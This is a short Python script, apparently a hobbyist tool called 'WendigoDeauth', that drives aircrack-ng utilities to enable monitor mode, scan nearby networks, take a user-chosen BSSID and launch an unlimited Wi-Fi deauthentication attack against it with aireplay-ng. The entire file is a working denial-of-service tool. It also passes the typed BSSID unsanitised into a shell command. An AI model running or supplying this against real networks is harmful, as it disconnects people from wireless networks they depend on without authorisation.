import os
os.system("figlet WendigoDeauth")

os.system("sudo airmon-ng start wlan0")
os.system("sudo airodump-ng wlan0mon")
print("PLEASE SELECT BSSID TO ATTACK")
select_network = input("WendigoDeauth>>>")
print(f'you selected: {select_network}')
print(f'starting deauth attack against {select_network}')
os.system(f'sudo aireplay-ng --deauth 0 -a {select_network} wlan0mon   ')